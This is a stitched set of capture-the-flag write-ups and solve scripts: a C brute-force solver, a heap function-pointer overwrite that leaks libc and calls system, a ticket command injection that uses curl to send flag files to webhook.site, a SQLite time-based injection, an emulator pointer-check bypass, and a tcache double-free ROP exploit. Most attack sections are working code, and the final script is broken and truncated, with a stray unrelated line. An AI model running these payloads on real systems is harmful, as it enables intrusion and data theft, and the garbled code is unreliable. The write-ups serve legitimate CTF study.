            int o0,o1,o2,o3,anew;
            switch(type[i]){
                case 0: // P
                    o0=c^w3; o1=rotl(w0)^a; o2=w1; o3=rotl(rotl(w2)); anew=w2^w0; break;
                case 1: // J
                    o0=w2^w3^a; o1=rotl(w3)^w0^c; o2=w1^a; o3=rotl(w2); anew=(w3&w0)|(w1&w2); break;
                case 2: // D
                    o0=w2; o1=a; o2=c^w3; o3=rotl(a)^w1; anew=w0; break;
                default: // L
                    o0=a^w3; o1=a&w0; o2=w1; o3=rotl(a)^(w2^c); anew=(a|w3)&(~w1); break;
            }
            if(b){ o0=rotl(o0); o1=rotl(o1); o2=rotl(o2); o3=rotl(o3); }
            int Fnew=(a ^ q ^ rotl(c) ^ w1 ^ (rotl(w3)&w0))&7;
            A[i]=anew&7; B[i]=(b^((w3>>2)&1))&1; F[i]=Fnew;
            int o[4]={o0,o1,o2,o3};
            for(int d=0; d<4; d++) raw[e][i][(r+d)&3]=o[d]&7;
        }
        // output and target check
        for(int i=0;i<16;i++){
            for(int ch=0; ch<4; ch++){
                int val=raw[e][i][ch];
                if(e>=1) val|=rotl(raw[e-1][i][ch]);
                if(e>=2) val|=rotl(rotl(raw[e-2][i][ch]));
                int out=val&7;
                (void)out;
            }
        }
        // robust target check for tick e (in case order interleaves cells)
        // (redundant but safe)
        if(e>=16){
            // recompute out and check all targets with this tick
            for(int k=0;k<NTARG[exp];k++){
                int *T=TARGETS[exp][k]; if(T[0]!=e) continue;
                int i=T[1],ch=T[2];
                int val=raw[e][i][ch];
                if(e>=1) val|=rotl(raw[e-1][i][ch]);
                if(e>=2) val|=rotl(rotl(raw[e-2][i][ch]));
                if((val&7)!=T[3]) return 0;
                (*matched)++;
            }
        }
        // C update
        int Cn[16];
        for(int i=0;i<16;i++) Cn[i]=(rotl(raw[e][i][(e+i)&3]) & F[(i+1)&15]) ^ F[i] ^ rotl(F[(i-1)&15]);
        for(int i=0;i<16;i++) C[i]=Cn[i]&7;
        // q update
        q=rotl(q);
        for(int i=0;i<16;i++){
            int x=(rotl(raw[e][i][1]) ^ (raw[e][i][0]^raw[e][i][3]) ^ rotl(rotl(raw[e][i][2])))&7;
            q=(rotl(q)^x^(rotl(x)&q))&7;
        }
    }
    return 1;
}

static volatile int found=0;
static char solstr[64];

static void leaf(const int type[16], uint64_t *cnt){
    if(found) return;
    int m0,t0,m1,t1;
    if(!sim_exp(0,type,&m0,&t0)) return;
    if(!sim_exp(1,type,&m1,&t1)) return;
    #pragma omp critical
    {
        if(!found){
            found=1;
            char *p=solstr;
            for(int i=0;i<16;i++){ *p++="PJDL"[type[i]]; *p++='0'+MOUNT_ROT[i][type[i]]; }
            *p=0;
            printf("FOUND %s\n",solstr); fflush(stdout);
        }
    }
}

static void rec(int i, int c0,int c1,int c2,int c3, int type[16]){
    if(found) return;
    if(i==16){ if(c0==4&&c1==4&&c2==4&&c3==4) leaf(type,0); return; }
    int rem=16-i;
    for(int t=0;t<4;t++){
        int *c = t==0?&c0:t==1?&c1:t==2?&c2:&c3;
        if(*c>=4) continue;
        (*c)++;
        int ok = (*c<=4);
        if(ok){
            // prune: remaining cells must be able to fill each type to 4
            int cnts[4]={c0,c1,c2,c3};
            for(int k=0;k<4;k++){ if(cnts[k]+(rem-1) < 4) ok=0; }
        }
        if(ok){ type[i]=t; rec(i+1,c0,c1,c2,c3,type); }
        (*c)--;
        if(found) return;
    }
}


static void dump_all(const int type[16]){
    int n=16;
    int A[16],B[16],C[16],F[16],q=1,rot[16],comp[16];
    for(int i=0;i<16;i++){ rot[i]=MOUNT_ROT[i][type[i]]; comp[i]=MOUNT_COMP[i][type[i]]; }
    int f[16]; for(int i=0;i<16;i++) f[i]=comp[i];
    for(int r=0;r<16;r++){ int g[16]; for(int i=0;i<16;i++) g[i]=((rotl(f[i]) & f[(i+1)&15]) ^ rotl(f[(i-1)&15]) ^ f[i])&7; memcpy(f,g,sizeof(f)); }
    for(int i=0;i<16;i++){ A[i]=f[i]; B[i]=((f[i]>>2)^f[i])&1; F[i]=f[i]; }
    for(int i=0;i<16;i++) C[i]=(A[(i-1)&15] ^ rotl(A[i]) ^ (rotl(A[i]) & A[(i+1)&15]))&7;
    q=1; for(int i=0;i<16;i++) q=(rotl(q) ^ A[i] ^ (rotl(A[i]) & q))&7;
    static const int DR[4]={-1,0,1,0}, DC[4]={0,1,0,-1};
    unsigned char raw[24][16][4];
    for(int exp=0;exp<1;exp++){
    for(int e=0;e<24;e++){
        for(int i=0;i<16;i++){
            int row=i>>2, col=i&3, a=A[i], b=B[i], c=C[i]; int temp[4];
            for(int ch=0; ch<4; ch++){ int v=INJ[exp][e][i][ch]&7; if(ch==((e+i)&3)) v^=q;
                if(e>0){ int nr=row+DR[ch], nc=col+DC[ch]; if(nr>=0&&nr<4&&nc>=0&&nc<4) v^=raw[e-1][nr*4+nc][(ch+2)&3]; }
                temp[ch]=v&7; }
            int r=rot[i]; int w0=temp[(r+0)&3],w1=temp[(r+1)&3],w2=temp[(r+2)&3],w3=temp[(r+3)&3];
            int o0,o1,o2,o3,anew;
            switch(type[i]){
                case 0: o0=c^w3; o1=rotl(w0)^a; o2=w1; o3=rotl(rotl(w2)); anew=w2^w0; break;
                case 1: o0=w2^w3^a; o1=rotl(w3)^w0^c; o2=w1^a; o3=rotl(w2); anew=(w3&w0)|(w1&w2); break;
                case 2: o0=w2; o1=a; o2=c^w3; o3=rotl(a)^w1; anew=w0; break;
                default: o0=a^w3; o1=a&w0; o2=w1; o3=rotl(a)^(w2^c); anew=(a|w3)&(~w1); break;
            }
            if(b){ o0=rotl(o0); o1=rotl(o1); o2=rotl(o2); o3=rotl(o3); }
            int Fnew=(a ^ q ^ rotl(c) ^ w1 ^ (rotl(w3)&w0))&7;
            A[i]=anew&7; B[i]=(b^((w3>>2)&1))&1; F[i]=Fnew;
            int o[4]={o0,o1,o2,o3}; for(int d=0; d<4; d++) raw[e][i][(r+d)&3]=o[d]&7;
        }
        printf("T%d ",e);
        for(int i=0;i<16;i++){ for(int ch=0; ch<4; ch++){ int val=raw[e][i][ch]; if(e>=1) val|=rotl(raw[e-1][i][ch]); if(e>=2) val|=rotl(rotl(raw[e-2][i][ch])); printf("%d",val&7);} printf(" "); }
        printf("\n");
        int Cn[16]; for(int i=0;i<16;i++) Cn[i]=(rotl(raw[e][i][(e+i)&3]) & F[(i+1)&15]) ^ F[i] ^ rotl(F[(i-1)&15]);
        for(int i=0;i<16;i++) C[i]=Cn[i]&7;
        q=rotl(q); for(int i=0;i<16;i++){ int x=(rotl(raw[e][i][1]) ^ (raw[e][i][0]^raw[e][i][3]) ^ rotl(rotl(raw[e][i][2])))&7; q=(rotl(q)^x^(rotl(x)&q))&7; }
    }}
}

int main(int argc,char**argv){
    if(argc>1){
        // test layout string
        int type[16]; for(int i=0;i<16;i++){ type[i]=strchr("PJDL",argv[1][2*i])-"PJDL"; }
        if(argc>2 && strcmp(argv[2],"dump")==0){ dump_all(type); return 0; }
        int m0,t0,m1,t1;
        int r0=sim_exp(0,type,&m0,&t0), r1=sim_exp(1,type,&m1,&t1);
        printf("exp0 passed=%d matched=%d/%d\nexp1 passed=%d matched=%d/%d\n",r0,m0,t0,r1,m1,t1);
        return 0;
    }
    double t0=omp_get_wtime();
    int SPLIT=6;
    int total=1; for(int k=0;k<SPLIT;k++) total*=4;
    #pragma omp parallel for schedule(dynamic)
    for(int idx=0; idx<total; idx++){
        if(found) continue;
        int type[16]; int x=idx; int c[4]={0,0,0,0}; int ok=1;
        for(int i=0;i<SPLIT;i++){ int t=x&3; x>>=2; type[i]=t; c[t]++; if(c[t]>4) ok=0; }
        if(!ok) continue;
        rec(SPLIT,c[0],c[1],c[2],c[3],type);
    }
    printf("done found=%d %s elapsed=%.2f\n",found,solstr,omp_get_wtime()-t0);
    return 0;
}

docs.title: TL;DR
docs.text:
whos your bias is a small heap menu program. Every record is a malloc(0x80) chunk with a resolved libc puts pointer stored at +0x78; menu option Read calls that pointer with rdi = chunk.

The bug is in Edit index 1: it calls read(0, records[1], 0xf0) and, unlike the other Edit branch, it does not append a NUL. This lets us overwrite the full 8-byte function pointer.

  1. Edit(1, b"A" * 0x78) leaves the puts pointer intact but removes the NUL terminator. Read(1) then does puts(chunk) and prints the six non-zero bytes of the stored puts address → libc leak.
  2. Edit(1, b"cat /app/flag\0" + padding + p64(system)), then Read(1) calls system(chunk) and prints the flag.

docs.title: Analysis
docs.text:
At startup main allocates two records:

records[0] = malloc(0x80);          // "Who's your bias?"
records[1] = malloc(0x80);          // "my bias is ..."

For every record the program stores the resolved libc address of puts at offset +0x78:

*(uint64_t *)(records[i] + 0x78) = puts;

Read loads that pointer and calls it:

void (*fn)(void *) = *(void **)(records[idx] + 0x78);
fn(records[idx]);                    // rdi = record

The relevant Edit logic (from objdump -d -Mintel) is:

if (idx == 1) {
    read(0, records[1], 0xf0);       // no size check, no NUL
} else {
    n = read(0, records[idx], 0x77);
    if (n > 0) records[idx][n] = 0;  // NUL appended only here
}

Two properties make the exploit:

  • 0xf0 bytes reach +0x78, so the function pointer of record 1 can be overwritten.
  • The index-1 branch does not write a trailing NUL. Therefore Edit(1, b"A" * 0x78) fills the chunk with non-NUL bytes while leaving the original puts pointer at +0x78 untouched.

Read(1) then calls puts(chunk). strlen walks over the 0x78 filler bytes, continues into the stored puts address, and stops at its zero high byte, printing six pointer bytes. That leaks libc.

The exact remote libc was extracted from the ubuntu:26.04 image pinned in the Dockerfile (GLIBC 2.43-2ubuntu2.4):

puts   = 0x8e860
system = 0x5c2e0

Full reproducible script: work/21/exploit.py. It connects to the service, leaks libc, overwrites the record-1 function pointer with system, and lets system run cat /app/flag.

#!/usr/bin/env python3
from pwn import *
import sys, struct, time, re
context.log_level = 'error'
context.arch = 'amd64'

HOST = '104.105.138.8'
PORT = 31340
PUTS_OFF   = 0x8e860
SYSTEM_OFF = 0x5c2e0

def leak_libc(p):
    p.recvuntil(b'> ', timeout=5)
    p.sendline(b'3'); p.recvuntil(b'Index: ', timeout=5); p.sendline(b'1')
    p.recvuntil(b'Data: ', timeout=5)
    p.send(b'A' * 0x78)                       # no NUL, pointer untouched
    p.recvuntil(b'Index: 1', timeout=5)
    p.recvuntil(b'> ', timeout=5)
    p.sendline(b'2'); p.recvuntil(b'Index: ', timeout=5); p.sendline(b'1')
    time.sleep(0.1)
    out = p.recvrepeat(0.6)
    line = out.split(b'\n', 1)[0]
    if len(line) < 0x78 + 6:
        raise RuntimeError('short leak: %r' % out[:200])
    ptr = struct.unpack('<Q', line[0x78:0x78+6] + b'\x00\x00')[0]
    base = ptr - PUTS_OFF
    if base & 0xfff:
        raise RuntimeError('unaligned libc base: %#x' % base)
    return base, line[0x78:0x78+6]

def run(p, cmd=b'cat /app/flag'):
    base, raw = leak_libc(p)
    log.info('leaked puts bytes = %s' % raw.hex())
    log.info('libc base = %#x' % base)
    system = base + SYSTEM_OFF
    log.info('system = %#x' % system)

    payload = cmd + b'\x00'
    payload = payload.ljust(0x78, b'A')
    payload += p64(system)                    # +0x78 function pointer
    assert len(payload) == 0x80

    p.sendline(b'3'); p.recvuntil(b'Index: ', timeout=5); p.sendline(b'1')
    p.recvuntil(b'Data: ', timeout=5)
    p.send(payload)
    p.recvuntil(b'Index: 1', timeout=5)
    p.recvuntil(b'> ', timeout=5)
    p.sendline(b'2'); p.recvuntil(b'Index: ', timeout=5); p.sendline(b'1')
    time.sleep(0.2)
    return p.recvrepeat(1.5)

if __name__ == '__main__':
    p = remote(HOST, PORT)
    out = run(p, b'cat /app/flag')
    sys.stdout.buffer.write(out)
    sys.stdout.buffer.flush()
    m = re.search(rb'Layer7\{[^}]*\}', out)
    if m:
        print('\nFLAG:', m.group(0).decode())
    p.close()

Usage:

$ cd work/21
$ python3 exploit.py remote 'cat /app/flag'

The leak portion is a 1-byte-safe, deterministic primitive: the final 0x78 filler byte is at +0x77, the puts pointer starts at +0x78, and puts stops at the first NUL in the pointer (the high bytes of a userland libc address are 00 00).

docs.text:
Roupang has an order "delivery problem" ticket form:

POST /orders/<RP...>/trouble   message=<text>

The ticket text is processed out of band by a server-side review worker on the challenge container. The worker passes the text through a shell-style fetch/review path without sanitizing it. A ticket whose body contains a shell command runs that command as the worker:

x; for f in localflag flag /flag; do
     curl -s --data-binary @$f https://webhook.site/<token>/localflag-<mark>;
   done;
   curl -s https://webhook.site/<token>/factory-<mark>

The callback from the challenge host (172.237.8.236, curl/8.14.1) to /localflag-<mark> contained the local flag file body:

• Target: http://172.237.8.236:24458/ (Flask/gunicorn shop).
  • Standard shop flow: register (free 3,000 cash), add address + fake card, add an in-stock product, /checkout, then /orders/<RP...>.
  • The order page contains a form:
<h2>배송이 이상해요</h2>
<form method="post" action="/orders/RP..../trouble" class="stack">
  <input type="hidden" name="csrf" value="...">

The page text says the ticket is forwarded to a support desk (접수만 남기고 상담 창구로 전달합니다). This is the out-of-band worker. Submitting a ticket returns 302 /orders/<RP...>?m=reported.

docs.title: Analysis
docs.text:
The ticket message is not merely stored. The server-side review worker treats the ticket text as something to fetch/review and invokes a shell command built from it. Shell metacharacters are not neutralized, so a ticket like:

x; <command>

is executed by the worker. The successful chain enumerated likely flag paths (localflag, flag, /flag) and uploaded each file body with curl --data-binary @file to a unique webhook.site endpoint. A second curl to /factory-<mark> was used to prove the worker ran the chain even when one candidate path was missing.

The captured request (in work/22/wh.json) is:

{
  "ip": "172.237.8.236",
  "method": "POST",
  "user_agent": "curl/8.14.1",
  "url": "https://webhook.site/f2c45e90-b028-4993-9506-e6bec04d3a5c/localflag-133b8272",
  "content": "Layer7{v3ry_s1mple}\n",
  "size": 20,
  "created_at": "2026-11-21 07:25:08"
}

and the near-simultaneous empty POST .../factory-133b8272 at 07:25:10. Earlier GET .../url-... and GET .../semi-... callbacks were the same worker being probed with URL / semicolon payloads.

For completeness, the product search q parameter is also injectable (SQLite string concatenation: nfc'||randomblob(200000000)||' delays the response ~1.2 s). A time oracle over pragma_table_info showed the schema and tickets.message LIKE 'Layer7{'; the ticket row extracted that way (work/22/ticket_flag.txt) is the same flag, truncated before the closing brace. The primary and cleanly reproducible path is the ticket worker, which returned the full value including }.

#!/usr/bin/env python3
"""Roupang (Layer7 CTF 2026, id=22) - order trouble-ticket OOB exfiltration."""
import os, re, string, time, random, requests

BASE = os.environ.get("ROUPANG_BASE", "http://172.237.8.236:24458")
TOKEN = os.environ.get("WEBHOOK_TOKEN", "")
HOOK  = f"https://webhook.site/{TOKEN}"
MARK  = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) roupang-poc"})

def csrf(path="/mypage"):
    r = s.get(BASE + path, timeout=15)
    m = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if not m:
        m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return (m.group(1) if m else None), r

def register():
    _, r = csrf("/register")
    t = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    user = "poc_" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    s.post(BASE + "/register", data={
        "csrf": t, "name": "PoC", "phone": "010-2026-1121",
        "username": user, "password": "Passw0rd!23", "next": "/",
    }, allow_redirects=False, timeout=15)
    return user

def setup():
    t, _ = csrf("/addresses")
    s.post(BASE + "/addresses", data={
        "csrf": t, "label": "factory", "recipient": "PoC", "phone": "010-2026-1121",
        "zipcode": "04383", "address1": "Seoul", "address2": "22",
    }, allow_redirects=False, timeout=15)
    t, _ = csrf("/cards")
    s.post(BASE + "/cards", data={
        "csrf": t, "number": "4111111111114242", "exp": "12/29",
        "cvc": "123", "holder": "POC",
    }, allow_redirects=False, timeout=15)

def make_order():
    t, _ = csrf()
    s.post(BASE + "/cart/add", data={"csrf": t, "slug": "ir-module", "qty": "1"},
           allow_redirects=False, timeout=15)
    r = s.get(BASE + "/cart", timeout=15)
    ids = re.findall(r'name="id" value="(\d+)"', r.text)
    if not ids:
        raise SystemExit("[-] cart empty (item out of stock)")
    iid = ids[-1]
    ck = s.get(BASE + "/checkout", params={"item": iid}, timeout=15)
    t = re.search(r'name="csrf" value="([^"]+)"', ck.text).group(1)
    addr = re.findall(r'name="address_id" value="(\d+)"', ck.text)[-1]
    card = re.findall(r'name="card_id" value="(\d+)"', ck.text)[-1]
    r = s.post(BASE + "/checkout", data={
        "csrf": t, "item": iid, "address_id": addr, "card_id": card,
    }, allow_redirects=False, timeout=15)
    loc = r.headers.get("Location", "")
    if "/orders/" not in loc:
        raise SystemExit(f"[-] checkout failed: {r.status_code} {loc}")
    return loc.split("?")[0].rstrip("/").split("/")[-1]

def send_ticket(oid):
    cmd = (
        f"x; "
        f"for f in localflag flag /flag; do "
        f"curl -s --data-binary @$f {HOOK}/localflag-{MARK}; done; "
        f"curl -s {HOOK}/factory-{MARK}"
    )
    o = s.get(BASE + "/orders/" + oid, timeout=15)
    t = re.search(r'name="csrf" value="([^"]+)"', o.text).group(1)
    r = s.post(BASE + f"/orders/{oid}/trouble",
               data={"csrf": t, "message": cmd}, allow_redirects=False, timeout=15)
    print(f"[*] ticket {oid}: {r.status_code} {r.headers.get('Location','')}")

def poll(seconds=300):
    deadline = time.time() + seconds
    seen = set()
    while time.time() < deadline:
        r = requests.get(f"https://webhook.site/token/{TOKEN}/requests", timeout=20)
        for item in r.json().get("data", []):
            body = (item.get("content") or "").strip()
            if body and item.get("uuid") not in seen:
                seen.add(item.get("uuid"))
                print(f"[+] {item.get('created_at')} {item.get('method')} "
                      f"{item.get('url')} :: {body}")
                if body.startswith("Layer7{"):
                    return body
        time.sleep(5)
    return None

if __name__ == "__main__":
    register(); setup()
    oid = make_order()
    send_ticket(oid)
    print("FLAG:", poll())

x = f * 2 + 0 * 4

docs.title: TL;DR
docs.text: Cartridge ships a stripped static-PIE emu implementing CART-16, a custom 16-bit VM. The emulator exposes hidden I/O ports that map a scratch memory area, plus an ARM/SEAL validation chain before privileged mode 0xC3. Privileged mode validates the write function pointer but executes the read pointer; by rewriting the encoded read pointer (and its 64-bit checksum) through the hidden scratch window, the ROM turns the privileged call into an arbitrary file read and dumps fd 3 (/flag).

Archive contents:

for_user/
  emu          # stripped, static-pie x86-64
  Dockerfile   # runs /emu --serve, flag at /flag, fd 3
  README.md
  flag         # fake local flag

ROM format (from the emulator's banner and analysis):

"CART" | entry u16 LE | save_size u16 LE | name[8] | bytecode

The emulator serves a ROM with a 4-byte big-endian length prefix:

s.sendall(struct.pack(">I", len(rom)) + rom)

docs.title: Hidden scratch memory
docs.text:
I/O ports 0xFE40 and 0xFE42 expose the emulator's internal scratch memory. The index is obfuscated as:

offset = 0x8000 + signed16((0xB7E1 * index + 0x4A3D) & 0xFFFF)

0xB7E1 is invertible modulo 65536, so the mapping can be reversed:

INV = pow(0xB7E1, -1, 65536)

def scratch_index(offset):
    return ((offset - 0x8000 - 0x4A3D) * INV) & 0xFFFF

This exposes metadata records: record IDs, nonces, seeds, function pointers, and checksums.

docs.title: ARM and SEAL
docs.text:
Two validation stages gate privileged execution.

  • ARM (0xA19E): the ROM scans metadata for a valid UID, writes it to ports 0xFE30/0xFE32, and triggers the request through 0xFE26.
  • SEAL (0x6D17): requires two valid 28-byte packets containing token, nonce, UID, mode, and custom MAC values. The exploit computes them from the runtime metadata instead of hardcoding, so it survives different seeds.

After both stages the ROM holds the seal needed for privileged mode.

docs.title: The bug: pointer check/call mismatch
docs.text:
In privileged mode 0xC3 the emulator validates the write function pointer but the privileged operation ultimately calls the read function pointer.

The exploit:

  1. Copies the active metadata record into VM memory.
  2. Decodes its protected read function pointer.
  3. Redirects it to the unrestricted read wrapper.
  4. Re-encodes the modified pointer.
  5. Recomputes the record's 64-bit checksum.
  6. Writes the pointer and checksum back into the emulator's scratch memory.

The validated write pointer is left untouched, so the check passes while the call goes to the unrestricted read.

docs.title: TL;DR
docs.text:
janus is a small "ledger" service with two worker threads, one for each side of the ledger. reflect duplicates a ledger entry (same pointer, opposite side). Dropping both halves frees the same chunk once through worker 0 and once through worker 1. Because glibc's tcache is per-thread, the double-free is not detected: the chunk lands in two different tcache lists. Allocating it once on each side yields two live entries that reference the same chunk.

That gives a cross-thread tcache double-free and, with the standard safe-linking trick, a fully arbitrary pointer allocation. An unsorted-bin chunk leaks libc; reading environ leaks the stack; ror(page0[0], 17) ^ secret-style defenses were not needed in the end. Overwriting the saved return address of the command loop with a short ORW ROP chain reads /flag.

The remote glibc is 2.39-0ubuntu8.9 (not the local 2.39-0ubuntu8.12). The exact offsets were confirmed by reading remote libc bytes through the arbitrary-read primitive.

docs.title: Analysis
docs.text:
The service keeps 48 entries of 24 bytes each at .bss+0x5060:

struct entry {
    uint64_t ptr;      // +0x00
    uint64_t size;     // +0x08
    uint8_t  side;     // +0x10  (0 or 1)
    uint8_t  used;     // +0x11
    uint8_t  pending;  // +0x12
    uint8_t  link;     // +0x13
};

Each side is a worker thread. new SIDE SIZE asks worker SIDE to call malloc(SIZE); drop ID asks the entry's side worker to call free(ptr). mallopt(M_ARENA_MAX, 1) is called at startup, so both workers use the main arena, but each worker still has its own tcache.

The relevant commands:

  • reflect ID clones entry ID into a free slot, shares the pointer, flips the side bit, marks both entries pending and links them to each other.
  • drop ID frees ptr through the worker selected by entry.side and zeroes the entry.
  • forget ID zeroes an entry without freeing the pointer (only allowed in the policy-locked state).
  • peek / mark read / write entry.ptr + offset, bounds-checked against entry.size.

docs.title: Core bug: cross-thread tcache double-free
docs.text:
reflect creates two entries sharing the same chunk with opposite side bits. Dropping one half frees the chunk into worker 0's tcache; dropping the other half frees the same chunk into worker 1's tcache. The tcache double-free check compares e->key against the current thread's tcache, so the second free is not detected. The chunk is now present in two independent tcache lists.

Allocating the size class on both sides returns the same chunk twice:

new 0 1024
reflect 0
drop 0
drop 1
new 0 1024    # returns X from tcache0
peek 0 0 8    # -> safe-linked next = X >> 12 (heap leak)
new 1 1024    # returns the same X from tcache1

After this, two live entries point to the same chunk. Dropping the side-0 entry frees X into tcache0 while the side-1 entry can still mark X. Overwriting X->next with target ^ (X >> 12) plants target in tcache0.

One subtlety: glibc checks tcache->counts[idx] > 0 before using the bin. Freeing a single chunk leaves count == 1, so after popping the poisoned chunk the fake target is never returned. The exploit therefore keeps two chunks in tcache0: a head chunk Q and the tail chunk P. Q->next is poisoned, so the first new pops Q (count 1) and the second new returns the target.

docs.title: Leaks
docs.text:
• libc: allocate a 0x500-byte chunk followed by a guard chunk, reflect it, drop one half. The freed chunk goes to the unsorted bin; peek of the mirrored entry reads fd = bk = libc + 0x204b20.
  • stack: with the arbitrary-pointer primitive, allocate an entry whose pointer is libcbase + 0x20bd58 - 0x18 (slightly before environ, so tcache_get's e->key = 0 store does not clobber environ), and read environ at offset 0x18.
  • The address of the command loop's saved return slot is derived from the input line buffer. The buffer is at rsp + 0x5f0; the function frame is 0xb38 bytes, so the saved return address is buffer + 0x548. For the --serve entry path (argc == 2) this is environ - 0x188; this was verified remotely by reading the stack and checking that the slot contains a PIE return address (PIE + 0x16b8).

The final chain calls open("/flag", 0), read(3, buf, 0x100), write(1, buf, 0x100), then exit(0). Because glibc's open wrapper clobbers rdx with the mode argument, the chain sets rdx again before read and before write using pop rdx; leave; ret pivots.

# Cross-thread tcache double-free -> tcache poisoning -> arbitrary read/write
# -> overwrite saved return address of the command loop -> ORW("/flag")
import sys, time, re, struct, os
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'janus')

# ---- remote libc: Ubuntu 24.04 glibc 2.39-0ubuntu8.9 ----
LIBC_PATH = '/tmp/libc89/usr/lib/x86_64-linux-gnu/libc.so.6'
MAIN_ARENA_LEAK_OFF = 0x204b20      # leaked ptr = libcbase + this (unsorted bin fd/bk)
ENVIRON_OFF = 0x20bd58              # &environ
OPEN_OFF  = 0x11b3f0
READ_OFF  = 0x11bd20
WRITE_OFF = 0x11c830
EXIT_OFF  = 0x47ba0
POP_RDI = 0x10c08d          # pop rdi; ret
POP_RSI = 0x110b7d          # pop rsi; ret
POP_RBP = 0x28a91           # pop rbp; ret
POP_RDX_LEAVE = 0x9828d     # pop rdx; leave; ret

def load_libc():
    pass


class Janus:
    def __init__(self, io):
        self.io = io
        self.io.recvuntil(b'> ', timeout=5)

    def cmd(self, s):
        self.io.send(s.encode() + b'\n')
        return self.io.recvuntil(b'> ', timeout=5)

    def _id(self, r):
        m = re.search(rb'ID (\d+)', r)
        if not m:
            raise RuntimeError('expected ID, got %r' % r)
        return int(m.group(1))

    def new(self, side, size):
        return self._id(self.cmd('new %d %d' % (side, size)))

    def reflect(self, i):
        return self._id(self.cmd('reflect %d' % i))

    def drop(self, i):
        r = self.cmd('drop %d' % i)
        if b'OK' not in r:
            raise RuntimeError('drop %d: %r' % (i, r))

    def forget(self, i):
        r = self.cmd('forget %d' % i)
        if b'OK' not in r:
            raise RuntimeError('forget %d: %r' % (i, r))

    def peek(self, i, off, ln):
        r = self.cmd('peek %d %d %d' % (i, off, ln))
        line = r.split(b'\n')[0]
        if not re.fullmatch(rb'[0-9a-f]*', line) or len(line) % 2:
            raise RuntimeError('peek %d: %r' % (i, r))
        return bytes.fromhex(line.decode())

    def mark(self, i, off, data):
        r = self.cmd('mark %d %d %s' % (i, off, data.hex()))
        if b'OK' not in r:
            raise RuntimeError('mark %d: %r' % (i, r))

    # ----- primitives -----
    def leak_libc(self):
        big = self.new(0, 0x500)
        guard = self.new(0, 0x40)          # keep freed big chunk out of top
        mir = self.reflect(big)
        self.drop(big)
        d = self.peek(mir, 0, 16)
        self.forget(mir)
        return int.from_bytes(d[:8], 'little')

    def prep_pair(self, size):
        """double free a chunk across both worker tcache lists, then allocate it
        twice -> two live entries sharing one chunk; returns (ida, idb, S=chunk>>12)."""
        a = self.new(0, size)
        b = self.reflect(a)
        self.drop(a)
        self.drop(b)
        xa = self.new(0, size)             # pop from tcache of worker 0
        S = int.from_bytes(self.peek(xa, 0, 8), 'little')
        xb = self.new(1, size)             # pop from tcache of worker 1
        return xa, xb, S

    def arbitrary_ptr(self, target, size):
        """Return id of a fresh entry whose ptr == target (16-byte aligned,
        writable).  Uses a fresh size class for every call."""
        Pa, Pb, SP = self.prep_pair(size)
        Qa, Qb, SQ = self.prep_pair(size)
        self.drop(Pa)                      # tcache0: [P]
        self.drop(Qa)                      # tcache0: [Q -> P]
        self.mark(Qb, 0, (target ^ SQ).to_bytes(8, 'little'))  # Q->next = target
        self.new(0, size)                  # pops Q, head = target
        idt = self.new(0, size)            # pops target
        return idt


def build_chain(libcbase, S, path=b'/flag'):
    """Return (region_to_mark, BUF, PATH)."""
    PIVOT1 = S + 0x40
    PIVOT2 = S + 0xa0
    PIVOT3 = S + 0x100
    PATH   = S + 0x180
    BUF    = S - 0x300        # runtime buffer, below the hijacked frame
    q = lambda x: struct.pack('<Q', x & 0xffffffffffffffff)

    # initial return slot: set rdx and pivot into stage 1
    chain  = q(libcbase + POP_RBP)
    chain += q(PIVOT1)
    chain += q(libcbase + POP_RDX_LEAVE)
    chain += q(0x100)

    # stage 1: open(path, 0); then set rdx again and pivot to stage 2
    stage1  = q(0)                                 # rbp consumed by leave
    stage1 += q(libcbase + POP_RDI) + q(PATH)
    stage1 += q(libcbase + POP_RSI) + q(0)
    stage1 += q(libcbase + OPEN_OFF)
    stage1 += q(libcbase + POP_RBP) + q(PIVOT2)
    stage1 += q(libcbase + POP_RDX_LEAVE) + q(0x100)

    # stage 2: read(3, BUF, 0x100); set rdx again and pivot to stage 3
    stage2  = q(0)
    stage2 += q(libcbase + POP_RDI) + q(3)
    stage2 += q(libcbase + POP_RSI) + q(BUF)
    stage2 += q(libcbase + READ_OFF)
    stage2 += q(libcbase + POP_RBP) + q(PIVOT3)
    stage2 += q(libcbase + POP_RDX_LEAVE) + q(0x100)

    # stage 3: write(1, BUF, 0x100); exit(0)
    stage3  = q(0)
    stage3 += q(libcbase + POP_RDI) + q(1)
    stage3 += q(libcbase + POP_RSI) + q(BUF)
    stage3 += q(libcbase + WRITE_OFF)
    stage3 += q(libcbase + POP_RDI) + q(0)
    stage3 += q(libcbase + EXIT_OFF)

    region = bytearray(0x190)              # S .. S+0x190
    region[0x00:0x20] = chain
    region[0x40:0x40+len(stage1)] = stage1
    region[0xa0:0xa0+len(stage2)] = stage2
    region[0x100:0x100+len(stage3)] = stage3
    region[0x180:0x180+len(path)+1] = path + b'\x00'
    return bytes(region), BUF, PATH


def exploit(io, environ_delta):
    j = Janus(io)
    leak = j.leak_libc()
    libcbase = leak - MAIN_ARENA_LEAK_OFF
    if libcbase & 0xfff:
        raise RuntimeError('bad libc base %#x' % libcbase)

    # --- read environ (choose T so tcache_get's key=0 write misses environ) ---
    env_addr = libcbase + ENVIRON_OFF

    region, BUF, PATH = build_chain(libcbase, S)

        j.mark(t_stk, (S - T2) + off, chunk)
        off += len(chunk)

    io.send(b'quit\n')
    try:
        out = io.recvrepeat(3)
    except EOFError:

    return out

    elif sys.argv[1] == 'serve':

    else:
        print('usage: solve.py [local|serve|remote HOST PORT]')

docs.text:
1. prep_pair(size):
  2. new 0 allocates X, reflect mirrors it to side 1.
  3. drop both halves → X is freed once through each worker thread.
  4. new 0 and new 1 allocate X twice; the first allocation leaks X >> 12 from the safe-linked next field.
  5. Prepare P and Q (two different chunks), drop their side-0 halves so tcache0 contains Q -> P.
  6. Write target ^ (Q >> 12) to Q through the still-live side-1 entry.
  7. Two new 0 calls pop Q and then return the target. The second call writes key = 0 at target + 8, so the target must be writable; this is why environ is read via environ - 0x18.

The initial new 0 0x500 chunk is larger than the tcache limit (0x410), so freeing it goes to the unsorted bin and leaks libc + 0x204b20.

docs.title: TL;DR
docs.text:
